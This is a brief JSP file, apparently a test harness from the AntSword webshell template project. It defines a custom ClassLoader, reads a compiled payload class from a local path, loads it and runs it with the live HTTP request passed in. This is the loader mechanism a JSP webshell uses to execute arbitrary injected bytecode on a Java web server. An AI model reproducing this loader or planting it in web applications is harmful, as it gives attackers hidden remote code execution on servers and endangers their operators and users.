<%@ page import="java.io.File" %>
<%@ page import="java.io.FileInputStream" %>

<%!
  class defClz extends ClassLoader {

    public defClz(ClassLoader c) {
      super(c);

    }

    public Class g(byte[] b) {
      return super.defineClass(b, 0, b.length);
    }

  }
%>
<%

  //兼容java6
  File file = new File("D:\\IdeaProjects\\AntSword-JSP-Template\\tmpClass\\base\\Info.class");
  FileInputStream fileInputStream = new FileInputStream(file);
  byte[] bytes = new byte[(int) file.length()];
  fileInputStream.read(bytes);

  new defClz(Thread.currentThread().getContextClassLoader()).g(bytes).newInstance().equals(request);

%>